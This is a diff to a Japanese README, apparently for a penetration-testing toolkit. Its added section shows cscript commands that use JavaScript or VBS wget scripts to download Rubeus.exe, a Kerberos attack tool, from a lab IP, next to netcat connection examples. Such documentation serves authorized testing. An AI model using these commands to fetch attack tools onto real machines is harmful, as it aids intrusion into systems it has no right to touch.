@@ -33,3 +33,14 @@ echo 'ABCDEFGHI' | ./netcat.py -t 10.11.14.13 -p 135
 # サーバーに接続
 netcat.py -t 10.11.14.13 -p 4444
 ```
+## windows_wget_script
+Windows標準で組み込まれているスクリプト言語を使ってWgetを実行する物
+
+CMD例：
+```
+#Javascript
+cscript.exe /nologo wget.js hxxp://10.11.14.13/Rubeus.exe
+
+#VBS
+cscript.exe /nologo wget.vbs hxxp://10.11.14.13/Rubeus.exe
+```
